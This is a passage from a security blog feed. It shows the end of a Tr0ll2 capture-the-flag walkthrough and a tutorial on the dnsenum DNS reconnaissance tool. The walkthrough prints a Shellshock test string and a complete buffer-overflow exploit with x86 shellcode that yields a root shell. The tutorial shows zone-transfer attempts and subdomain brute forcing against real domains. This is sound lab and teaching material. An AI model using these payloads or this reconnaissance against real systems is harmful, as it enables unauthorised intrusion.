<p>Next, the attack fools the shell into accepting a bogus function definition. You can use <a href="https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b">this string</a> to see if your bash is vulnerable to Shellshock: <code>x=&lsquo;() { :;}; echo VULNERABLE&rsquo; bash -c :</code>.</p>

<p>Now we know that what looked like gibberish before, is actually the syntax for defining functions. With a diference of a colon instead of a function statement. The <code>:</code> is a []shell built-in(<a href="https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b">https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b</a>) that does nothing. So, to the vulnerable shell, the function definition doesn&rsquo;t perform any action, and is then followed by an arbitrary command, that is happily executed: <code>() { :;}; CODE</code>.</p>

<p>Ok, back to the Tr0ll! To also confirm the SSH vulnerability, look in authorized_keys:</p>

<p><code>
noob@Tr0ll2:~$ cat .ssh/authorized_keys
command="echo TRY HARDER LOL!" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwi2G/kLMyjm/rrcQymKVqy4EgUyJ+3Oyv7D5QV73IWECguqrINI+OuY+zIV49ykebBYR15HkBYi/9GYZmHRD5CHq9I+zCLHv/9Kdf9Ae+HQIaF/X/3PC0lIx6XLmgIY66MwuMNmOvK7U8rERPUJxSmLKWvaSAP9/LXVOHfcrCZyyCc+ir6kxsKHzojM0EResF2RgKfbbZ2MFqr6YSO9+ohdZBgGVncc1ngtW0b7mKf1u+RTnP7XeWxOkD2nHpghvKs8wwXNw6vE12lNjzqjPDTb4yYVph8zHKPYZst6PT6qeLArJ7lKwX540FEp2q9Ji2xUTXVLBCYXiKZ0k7Ru69 noob@Tr0ll2
</code></p>

<p>There it is, the trolling message was the command that user noob was restricted to. Ok, let&rsquo;s move on and see how we can get root. I searched for some kernel exploits, but could only find some potential exploits for 64 bit systems, and this one is 32 bit. But then:</p>

<p><code>
ls /
bin   dev  home        lib     media  nothing_to_see_here  proc  run   selinux  sys  usr  vmlinuz
boot  etc  initrd.img  lost+found  mnt    opt              root  sbin  srv      tmp  var
</code></p>

<p>Didn&rsquo;t expect to get anything out of this, but..trolls..</p>

<p>```
noob@Tr0ll2:/$ file nothing_to_see_here/
nothing_to_see_here/: setuid directory
noob@Tr0ll2:/$ ls -l nothing_to_see_here/
total 4
drwsr-xr-x 5 root root 4096 Oct  4  2014 choose_wisely
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls -al *
door1:
total 16
drwsr-xr-x 2 root root 4096 Oct  4  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t</p>

<p>door2:
total 20
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t</p>

<p>door3:
total 16
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t
```</p>

<p>I expanded the list of files in these directories so I could see everything at a glance. Let&rsquo;s see what we have:</p>

<p><code>
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ file r00t
r00t: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x4ceb2022ad50bc899c84f5e30793fe06b0a166c0, not stripped
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
Usage: ./r00t input
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t lol
lol
</code></p>

<p>This appears to echo whatever you give it. I tried doing a strings on it but got permission denied error. Moved on to the next executable for now:</p>

<p>```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t
Good job, stand by, executing root shell&hellip;
BUHAHAHA NOOB!
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$
Broadcast message from noob@Tr0ll2</p>

<pre><code>(/dev/pts/0) at 12:57 ...
</code></pre>

<p>The system is going down for reboot NOW!
Connection to 192.168.217.129 closed by remote host.
Connection to 192.168.217.129 closed.
```</p>

<p>Ok..the troll is trying to annoy us..this binary rebooted the machine. I went on to the third and again it restarted! Not much likely for the binaries to be the same, and it was good that I had the initial picture of the binary sizes! It seems the trolling continues..by switching the binaries between directories! Keep in mind the binary sizes, and check often, because they get moved a lot.</p>

<p>``` plain
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t</p>

<p>2 MINUTE HARD MODE LOL
```</p>

<p>Wasn&rsquo;t sure what this one did, until I got a permission denied when running ls :&ndash;) so in those 2 minutes, we are probably stripped by even the basic permissions. By now, it seemed that the only interesting binary would be the one that takes user input (largest one), so I got back to it. I used <code>pattern_create.rb</code> to build a 500 bytes long string and feed it to the binary, and it segfaulted! So, we have a buffer overflow here!</p>

<p><code>plain
Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
</code></p>

<p>Let&rsquo;s see where exactly in the pattern it happens:</p>

<p><code>plain
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x6a413969 -l 500
[*] Exact match at offset 268
</code></p>

<p>Taking a closer look at the registers and stack:</p>

<p>``` plain
(gdb) r $(python -c &ldquo;print &lsquo;A&rsquo; * 268 + &lsquo;B&rsquo; * 4 + &lsquo;C&rsquo; * 16&rdquo;)</p>

<p>Starting program: /nothing_to_see_here/choose_wisely/door3/r00t $(python -c &ldquo;print &lsquo;A&rsquo; * 268 + &lsquo;B&rsquo; * 4 + &lsquo;C&rsquo; * 16&rdquo;)</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info r
eax            0x120    288
ecx            0x0  0
edx            0x0  0
ebx            0xb7fd1ff4   -1208147980
esp            0xbffffb50   0xbffffb50
ebp            0x41414141   0x41414141
esi            0x0  0
edi            0x0  0
eip            0x42424242   0x42424242
eflags         0x210286 [ PF SF IF RF ID ]
cs             0x73 115
ss             0x7b 123
ds             0x7b 123
es             0x7b 123
fs             0x0  0
gs             0x33 51
(gdb) x $esp
0xbffffb50: 0x43434343
```</p>

<p>ESP has been overwritten with part of our string, so we can craft some shellcode and jump to the address of ESP to execute it. I picked the <a href="https://www.exploit-db.com/exploits/40131/">Linux x86 execve /bin/sh</a> shellcode, which is 19 bytes long.</p>

<p>What we have now for a functional exploit:</p>

<ul>
<li><p>268 bytes to fill the buffer</p></li>
<li><p>overwrite EIP with the address of ESP, which is <code>0xbffffb50</code>, and in little endian it is <code>\x50\xfb\xff\xbf</code></p></li>
<li><p>NOP sled for padding</p></li>
<li><p>shellcode: <code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80</code></p></li>
</ul>


<p>Ran the exploit in GDB:</p>

<p><code>
(gdb) r $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
process 1838 is executing new program: /bin/dash
$ id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
</code></p>

<p>Remember that a shell which you get in GDB has the privileges that GDB runs at, so this is not a real root shell. We have to run it outside GDB. I did so and I got a big..segmentation fault! What worked in GDB didn&rsquo;t work outside it, and as I was getting frustrated, I looked at other writeups, to see if anyone else had the same problem. It seems it should have run smoothly, but there can be a discrepancy in memory between a live environment and a GDB one. I tweaked the ESP address a few times, before hitting the right one:</p>

<p>```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; * 268 + &ldquo;\x90\xfb\xff\xbf&rdquo; + &ldquo;x90&rdquo; * 16 + &ldquo;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80&rdquo;&rsquo;)</p>

<h1>id</h1>

<p>uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)</p>

<h1>ls /root/</h1>

<p>Proof.txt  core1  core2  core3  core4  goal  hardmode  lmao.zip  ran_dir.py  reboot</p>

<h1>cat /root/Proof.txt</h1>

<p>You win this time young Jedi&hellip;</p>

<p>a70354f0258dcc00292c72aab3c8b1e4<br/>
```</p>

<p>The valid ESP address was <code>0xbffffb90</code>. If you try it in GDB though, you will get a segfault there. Ah, this challenge trolled me on so many levels!</p>

<p>```
/ A visit to a fresh place will bring \
\ strange work.                       /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[dnsenum - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/05/29/dnsenum-kali-linux-tools/"/>
    <updated>2017-05-29T05:32:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/05/29/dnsenum-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look at dnsenum, one of the tools that come preinstalled on Kali for DNS information gathering.</p>

<!-- more -->


<p>Homepage: <a href="https://github.com/fwaeytens/dnsenum">https://github.com/fwaeytens/dnsenum</a></p>

<h3>dnsenum description</h3>

<blockquote><p>multithreaded perl script to enumerate DNS information of a domain and to discover non-contiguous ip blocks.</p>

<p>OPERATIONS:</p>

<p>1) Get the host&rsquo;s addresse (A record).</p>

<p>2) Get the namservers (threaded).</p>

<p>3) Get the MX record (threaded).</p>

<p>4) Perform axfr queries on nameservers and get BIND VERSION (threaded).</p>

<p>5) Get extra names and subdomains via google scraping (google query = &ldquo;allinurl: -www site:domain&rdquo;).</p>

<p>6) Brute force subdomains from file, can also perform recursion on subdomain that have NS records (all threaded).</p>

<p>7) Calculate C class domain network ranges and perform whois queries on them (threaded).</p>

<p>8) Perform reverse lookups on netranges ( C class or/and whois netranges) (threaded).</p>

<p>9) Write to domain_ips.txt file ip-blocks.</p></blockquote>

<h3>dnsenum options</h3>

<p>``` plain
dnsenum -h
dnsenum.pl VERSION:1.2.3
Usage: dnsenum.pl <a href="">Options</a> <domain>
Note: the brute force -f switch is obligatory.
GENERAL OPTIONS:
  &mdash;dnsserver   <server></p>

<pre><code>        Use this DNS server for A, NS and MX queries.
</code></pre>

<p>  &mdash;enum        Shortcut option equivalent to &mdash;threads 5 -s 15 -w.
  -h, &mdash;help        Print this help message.
  &mdash;noreverse       Skip the reverse lookup operations.
  &mdash;nocolor     Disable ANSIColor output.
  &mdash;private     Show and save private ips at the end of the file domain_ips.txt.
  &mdash;subfile <file>  Write all valid subdomains to this file.
  -t, &mdash;timeout <value> The tcp and udp timeout values in seconds (default: 10s).
  &mdash;threads <value> The number of threads that will perform different queries.
  -v, &mdash;verbose     Be verbose: show all the progress and all the error messages.
GOOGLE SCRAPING OPTIONS:
  -p, &mdash;pages <value>   The number of google search pages to process when scraping names,</p>

<pre><code>        the default is 5 pages, the -s switch must be specified.
</code></pre>

<p>  -s, &mdash;scrap <value>   The maximum number of subdomains that will be scraped from Google (default 15).
BRUTE FORCE OPTIONS:
  -f, &mdash;file <file> Read subdomains from this file to perform brute force.
  -u, &mdash;update  &lt;a|g|r|z></p>

<pre><code>        Update the file specified with the -f switch with valid subdomains.
a (all)     Update using all results.
g       Update using only google scraping results.
r       Update using only reverse lookup results.
z       Update using only zonetransfer results.
</code></pre>

<p>  -r, &mdash;recursion   Recursion on subdomains, brute force all discovred subdomains that have an NS record.
WHOIS NETRANGE OPTIONS:
  -d, &mdash;delay <value>   The maximum value of seconds to wait between whois queries, the value is defined randomly, default: 3s.
  -w, &mdash;whois       Perform the whois queries on c class network ranges.</p>

<pre><code>         **Warning**: this can generate very large netranges and it will take lot of time to performe reverse lookups.
</code></pre>

<p>REVERSE LOOKUP OPTIONS:
  -e, &mdash;exclude <regexp></p>

<pre><code>        Exclude PTR records that match the regexp expression from reverse lookup results, useful on invalid hostnames.
</code></pre>

<p>OUTPUT OPTIONS:
  -o &mdash;output <file>    Output in XML format. Can be imported in MagicTree (www.gremwell.com)
```</p>

<h3>Fix dnsenum whois and autoloader errors</h3>

<p>First, some preliminary troubleshooting information: dnsenum relies on some Perl modules that may not be already on your system. When running it with certain flags, you might see some warnings like this one: Warning: can&rsquo;t load Net::Whois::IP module, whois queries disabled. To fix it, install the module by running <code>perl -MCPAN -e shell</code> and then at the prompt: <code>install Net::Whois::IP</code>. If you try again, you might get a different error, however: Can&rsquo;t locate package AutoLoader for @net::Whois::IP::ISA at /usr/bin/dnsenum line 536. I scoured the Internet for a bit before finding a workaround: you can make it go away by adding <code>require AutoLoader;</code> to the module source code, or by removing the Autuloader reference: changing <code>@ISA = qw(Exporter AutoLoader);</code> to <code>@ISA = qw(Exporter);</code>. To find out where the module is located, use the CPAN tool:</p>

<p>``` plain
cpan -D Net::Whois::IP
Loading internal null logger. Install Log::Log4perl for logging messages
Reading &lsquo;/root/.cpan/Metadata&rsquo;
  Database was generated on Wed, 17 May 2017 06:54:04 GMT</p>

<h2>Net::Whois::IP</h2>

<pre><code>(no description)
B/BS/BSCHMITZ/Net-Whois-IP-1.19.tar.gz
/usr/local/share/perl/5.24.1/Net/Whois/IP.pm
Installed: 1.19
CPAN:      1.19  up to date
Ben Schmitz (BSCHMITZ)
ben@foink.com
</code></pre>

<p>```</p>

<p>You can see the path here, now go apply the fix in the IP.pm file and the error should go away.</p>

<h3>dnsenum usage</h3>

<ul>
<li>default</li>
</ul>


<p>``` plain
dnsenum yahoo.com
dnsenum.pl VERSION:1.2.3</p>

<p>&mdash;&mdash;&ndash;   yahoo.com   &mdash;&mdash;&ndash;</p>

<p>Host&rsquo;s addresses:</p>

<hr />

<p>yahoo.com.                               5        IN    A        206.190.36.45
yahoo.com.                               5        IN    A        98.139.183.24
yahoo.com.                               5        IN    A        98.138.253.109</p>

<p>Name Servers:</p>

<hr />

<p>ns1.yahoo.com.                           5        IN    A        68.180.131.16
ns3.yahoo.com.                           5        IN    A        203.84.221.53
ns4.yahoo.com.                           5        IN    A        98.138.11.157
ns2.yahoo.com.                           5        IN    A        68.142.255.16
ns5.yahoo.com.                           5        IN    A        119.160.247.124</p>

<p>Mail (MX) Servers:</p>

<hr />

<p>mta7.am0.yahoodns.net.                   5        IN    A        98.138.112.32
mta7.am0.yahoodns.net.                   5        IN    A        98.138.112.37
mta7.am0.yahoodns.net.                   5        IN    A        63.250.192.45
mta7.am0.yahoodns.net.                   5        IN    A        66.196.118.34
mta7.am0.yahoodns.net.                   5        IN    A        66.196.118.37
mta7.am0.yahoodns.net.                   5        IN    A        66.196.118.240
mta7.am0.yahoodns.net.                   5        IN    A        98.136.216.26
mta7.am0.yahoodns.net.                   5        IN    A        98.136.217.202
mta5.am0.yahoodns.net.                   5        IN    A        98.138.112.33
mta5.am0.yahoodns.net.                   5        IN    A        98.138.112.34
mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.33
mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.34
mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.35
mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.36
mta5.am0.yahoodns.net.                   5        IN    A        98.136.216.25
mta5.am0.yahoodns.net.                   5        IN    A        98.136.217.202
mta6.am0.yahoodns.net.                   5        IN    A        98.136.216.25
mta6.am0.yahoodns.net.                   5        IN    A        98.138.112.38
mta6.am0.yahoodns.net.                   5        IN    A        98.138.112.37
mta6.am0.yahoodns.net.                   5        IN    A        98.136.217.203
mta6.am0.yahoodns.net.                   5        IN    A        98.138.112.35
mta6.am0.yahoodns.net.                   5        IN    A        66.196.118.36
mta6.am0.yahoodns.net.                   5        IN    A        63.250.192.46
mta6.am0.yahoodns.net.                   5        IN    A        66.196.118.37</p>

<p>Trying Zone Transfers and getting Bind Versions:</p>

<hr />

<p>Trying Zone Transfer for yahoo.com on ns4.yahoo.com &hellip;
AXFR record query failed: REFUSED</p>

<p>Trying Zone Transfer for yahoo.com on ns5.yahoo.com &hellip;
AXFR record query failed: REFUSED</p>

<p>Trying Zone Transfer for yahoo.com on ns2.yahoo.com &hellip;
AXFR record query failed: REFUSED</p>

<p>Trying Zone Transfer for yahoo.com on ns3.yahoo.com &hellip;
AXFR record query failed: REFUSED</p>

<p>Trying Zone Transfer for yahoo.com on ns1.yahoo.com &hellip;
AXFR record query failed: REFUSED</p>

<p>brute force file not specified, bay.
```</p>

<p>From this output, you can see that the script performed DNS queries of the yahoo.com domain, enumerated the DNS and mail servers, and attempted zone transfers through the AXFR record type. Successful zone transfers are a misconfiguration that can have serious security impacts, because the DNS server sends its zone records to whoever requested them, thus revealing potentially sensitive information about the internal network topology, etc.</p>

<ul>
<li>with the &mdash;enum shortcut, which includes the flags: &mdash;threads 5 (5 threads), -s 15 (15 maximum subdomains to be scraped from Google), and -w (perform whois queries on class C ranges)</li>
</ul>


<p>``` plain
dnsenum &mdash;enum kali.org
dnsenum.pl VERSION:1.2.3</p>

<p>&mdash;&mdash;&ndash;   kali.org   &mdash;&mdash;&ndash;</p>

<p>Host&rsquo;s addresses:</p>

<hr />

<p>kali.org.                                5        IN    A        192.124.249.10</p>

<p>Name Servers:</p>

<hr />

<p>ns5.no-ip.com.                           5        IN    A        204.16.255.155
ns4.no-ip.com.                           5        IN    A        204.16.254.44
ns1.no-ip.com.                           5        IN    A        204.16.255.55
ns3.no-ip.com.                           5        IN    A        207.34.6.1
ns2.no-ip.com.                           5        IN    A        204.16.254.6</p>

<p>Mail (MX) Servers:</p>

<hr />

<p>aspmx.l.google.com.                      5        IN    A        108.177.15.27
alt3.aspmx.l.google.com.                 5        IN    A        74.125.23.26
alt4.aspmx.l.google.com.                 5        IN    A        74.125.28.26
alt1.aspmx.l.google.com.                 5        IN    A        108.177.14.27
alt2.aspmx.l.google.com.                 5        IN    A        74.125.200.27</p>

<p>Trying Zone Transfers and getting Bind Versions:</p>

<hr />

<p>Trying Zone Transfer for kali.org on ns2.no-ip.com &hellip;
AXFR record query failed: REFUSED</p>

<p>Trying Zone Transfer for kali.org on ns4.no-ip.com &hellip;
AXFR record query failed: REFUSED</p>

<p>Trying Zone Transfer for kali.org on ns3.no-ip.com &hellip;
AXFR record query failed: REFUSED</p>

<p>Trying Zone Transfer for kali.org on ns1.no-ip.com &hellip;
AXFR record query failed: NOTAUTH</p>

<p>Trying Zone Transfer for kali.org on ns5.no-ip.com &hellip;
AXFR record query failed: NOTAUTH</p>

<p>Scraping kali.org subdomains from Google:</p>

<hr />

<p> &mdash;&mdash;   Google search page: 1   &mdash;&mdash;</p>

<p> &mdash;&mdash;   Google search page: 2   &mdash;&mdash;</p>

<p>  docs</p>

<p> &mdash;&mdash;   Google search page: 3   &mdash;&mdash;</p>

<p>  de.docs
  archive</p>

<p> &mdash;&mdash;   Google search page: 4   &mdash;&mdash;</p>

<p>  archive-4
  ja.docs</p>

<p> &mdash;&mdash;   Google search page: 5   &mdash;&mdash;</p>

<p>Google Results:</p>

<hr />

<p>de.docs.kali.org.                        5        IN    A        192.124.249.10
ja.docs.kali.org.                        5        IN    A        192.124.249.10
docs.kali.org.                           5        IN    A        192.124.249.10
archive.kali.org.                        5        IN    CNAME    hera.kali.org.
hera.kali.org.                           5        IN    A        192.99.45.140
archive-4.kali.org.                      5        IN    CNAME    hecate.kali.org.
hecate.kali.org.                         5        IN    A        149.202.201.51</p>

<p>brute force file not specified, bay.
```</p>

<p>One thing that you should keep in mind is that the Google scraping feature might not always work. In that case, you can check manually by using the same Google operator that dnsenum uses, with &ldquo;allinurl:-www site:target.com&rdquo;</p>

<ul>
<li>bruteforce subdomains and perform whois queries</li>
</ul>


<p>dnsenum has a domain bruteforce file located at <code>/usr/share/dnsenum/dns.txt</code>:</p>

<p><code>plain
wc -l /usr/share/dnsenum/dns.txt
1480 /usr/share/dnsenum/dns.txt
</code></p>

<p>Let&rsquo;s see some domain bruteforcing in action! Again, looking at kali.org:</p>

<p>``` plain
dnsenum -f /usr/share/dnsenum/dns.txt -w &mdash;noreverse kali.org
[&hellip;]
Brute forcing with /usr/share/dnsenum/dns.txt:</p>

<hr />

<p>archive.kali.org.                        5        IN    CNAME    hera.kali.org.
hera.kali.org.                           5        IN    A        192.99.45.140
bugs.kali.org.                           5        IN    A        198.50.203.236
bugs.kali.org.                           5        IN    A        198.50.203.235
forums.kali.org.                         5        IN    A        192.124.249.12
hermes.kali.org.                         5        IN    A        198.27.70.128
http.kali.org.                           5        IN    CNAME    hebe.kali.org.
hebe.kali.org.                           5        IN    A        192.99.200.113
mail.kali.org.                           5        IN    CNAME    apollo.kali.org.
apollo.kali.org.                         5        IN    A        23.239.31.82
old.kali.org.                            5        IN    CNAME    hermes.kali.org.
hermes.kali.org.                         5        IN    A        198.27.70.128
pan.kali.org.                            5        IN    A        167.114.101.148
shop.kali.org.                           5        IN    A        45.79.147.167
www.kali.org.                            5        IN    A        192.124.249.10</p>

<p>Launching Whois Queries:</p>

<hr />

<p> whois ip result:   23.239.31.0        &ndash;>      23.239.0.0/19
 whois ip result:   45.79.147.0        &ndash;>      45.79.0.0/16
 whois ip result:   167.114.101.0      &ndash;>      167.114.0.0/16
 whois ip result:   192.99.45.0        &ndash;>      192.99.0.0/16
 whois ip result:   192.124.249.0      &ndash;>      192.124.249.0/24
 whois ip result:   198.27.70.0        &ndash;>      198.27.64.0/18
 whois ip result:   198.50.203.0       &ndash;>      198.50.203.0/27</p>

<p>kali.org________</p>

<p> 192.99.0.0/16
 23.239.0.0/19
 45.79.0.0/16
 198.50.203.0/27
 192.124.249.0/24
 167.114.0.0/16
 198.27.64.0/18</p>

<p>kali.org ip blocks:</p>

<hr />

<p> 23.239.31.82/32
 45.79.147.167/32
 167.114.101.148/32
 192.99.45.140/32
 192.99.200.113/32
 192.124.249.10/32
 192.124.249.12/32
 198.27.70.128/32
 198.50.203.235/32
 198.50.203.236/32</p>

<p>done.
```</p>

<p>And today&rsquo;s cow saying is:</p>

<p>``` plain
/ Tomorrow, this will be part of the    \
| unchangeable past but fortunately, it |
\ can still be changed today.           /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
